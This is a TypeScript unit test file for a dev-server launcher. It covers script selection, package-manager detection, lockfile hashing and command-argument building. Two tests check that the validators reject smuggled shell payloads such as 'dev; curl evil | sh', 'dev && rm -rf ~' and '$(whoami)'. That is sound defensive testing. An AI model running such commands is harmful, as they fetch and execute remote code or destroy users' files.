import { test } from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { detectPackageManager, pickScript, readPackageJson, lockfileHash, withExtraPath, pathKey, normalizePackageManagerSetting, isSafeScriptName } from '../../src/detect';
import { devArgs, installArgs, quoteIfNeeded } from '../../src/runner/commands';

function tmpProject(files: Record<string, string>): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'go-live-'));
  for (const [name, content] of Object.entries(files)) {
    fs.writeFileSync(path.join(dir, name), content);
  }
  return dir;
}

test('스크립트 우선순위 dev > start > serve > preview', () => {
  const pick = (pkg: Parameters<typeof pickScript>[0], forced?: string) => { const r = pickScript(pkg, forced); return r.kind === 'ok' ? r.script : r.kind; };
  assert.equal(pick({ scripts: { start: 'a', dev: 'b' } }), 'dev');
  assert.equal(pick({ scripts: { serve: 'a', start: 'b' } }), 'start');
  assert.equal(pick({ scripts: { preview: 'a', serve: 'b' } }), 'serve');
  assert.equal(pick({ scripts: { preview: 'a' } }), 'preview');
  assert.equal(pick({ scripts: { build: 'a' } }), 'none');
  assert.equal(pick({}), 'none');
});

test('강제 지정 스크립트는 package.json 에 있어야 하고 안전한 이름이어야 한다 (보안 결함 3)', () => {
  const pkg = { scripts: { dev: 'vite', 'dev:web': 'vite' } };
  assert.deepEqual(pickScript(pkg, 'dev:web'), { kind: 'ok', script: 'dev:web' });
  assert.deepEqual(pickScript(pkg, 'dve'), { kind: 'forcedMissing', script: 'dve' });
  assert.deepEqual(pickScript(pkg, 'dev; curl evil | sh'), { kind: 'forcedInvalid', script: 'dev; curl evil | sh' });
  assert.deepEqual(pickScript(pkg, 'dev && rm -rf ~'), { kind: 'forcedInvalid', script: 'dev && rm -rf ~' });
  assert.equal(isSafeScriptName('build:prod'), true);
  assert.equal(isSafeScriptName('$(whoami)'), false);
  assert.equal(isSafeScriptName('a b'), false);
});

test('packageManager 설정은 허용 목록 밖이면 auto (보안 결함 3)', () => {
  assert.equal(normalizePackageManagerSetting('pnpm'), 'pnpm');
  assert.equal(normalizePackageManagerSetting('curl evil.sh | sh; npm'), 'auto');
  assert.equal(normalizePackageManagerSetting(42), 'auto');
  assert.equal(normalizePackageManagerSetting(undefined), 'auto');
  const dir = tmpProject({ 'yarn.lock': '' });
  assert.equal(detectPackageManager(dir, {}, 'rm -rf / ; npm' as never), 'yarn');
});

test('lockfile 로 패키지 매니저를 감지한다', () => {
  assert.equal(detectPackageManager(tmpProject({ 'pnpm-lock.yaml': '' }), {}), 'pnpm');
  assert.equal(detectPackageManager(tmpProject({ 'yarn.lock': '' }), {}), 'yarn');
  assert.equal(detectPackageManager(tmpProject({ 'bun.lockb': '' }), {}), 'bun');
  assert.equal(detectPackageManager(tmpProject({ 'package-lock.json': '{}' }), {}), 'npm');
  assert.equal(detectPackageManager(tmpProject({}), {}), 'npm');
});

test('packageManager 필드와 설정이 lockfile 보다 우선한다', () => {
  const dir = tmpProject({ 'yarn.lock': '' });
  assert.equal(detectPackageManager(dir, { packageManager: 'pnpm@9.0.0' }), 'pnpm');
  assert.equal(detectPackageManager(dir, { packageManager: 'pnpm@9.0.0' }, 'bun'), 'bun');
});

test('깨진 package.json 은 invalid', () => {
  assert.equal(readPackageJson(tmpProject({ 'package.json': '{ oops' })), 'invalid');
  assert.equal(readPackageJson(tmpProject({})), undefined);
  assert.deepEqual(readPackageJson(tmpProject({ 'package.json': '{"name":"x"}' })), { name: 'x' });
});

test('lockfile 해시는 내용이 바뀌면 달라진다', () => {
  const dir = tmpProject({ 'package.json': '{}', 'package-lock.json': 'a' });
  const h1 = lockfileHash(dir);
  fs.writeFileSync(path.join(dir, 'package-lock.json'), 'b');
  assert.notEqual(h1, lockfileHash(dir));
});

test('withExtraPath 는 존재하는 디렉터리만 앞에 붙인다', () => {
  const env = { PATH: '/usr/bin' };
  const out = withExtraPath(env, [os.tmpdir(), '/definitely/not/here']);
  assert.ok(out.PATH!.startsWith(os.tmpdir() + path.delimiter));
  assert.equal(withExtraPath({ Path: 'x' }, ['/definitely/not/here']).Path, 'x');
  assert.equal(pathKey({ Path: 'x' }), 'Path');
});

test('명령 인자 구성', () => {
  assert.deepEqual(installArgs('npm', false), ['install', '--no-audit', '--no-fund']);
  assert.deepEqual(installArgs('npm', true), ['install', '--no-audit', '--no-fund', '--legacy-peer-deps']);
  assert.deepEqual(devArgs('npm', 'dev'), ['run', 'dev']);
  assert.deepEqual(devArgs('npm', 'dev', 3001), ['run', 'dev', '--', '--port', '3001']);
  assert.deepEqual(devArgs('pnpm', 'dev', 3001), ['run', 'dev', '--port', '3001']);
  assert.equal(quoteIfNeeded('dev'), 'dev');
  assert.equal(quoteIfNeeded('dev:web'), 'dev:web');
  if (process.platform !== 'win32') {
    assert.equal(quoteIfNeeded('my script'), "'my script'");
  }
});
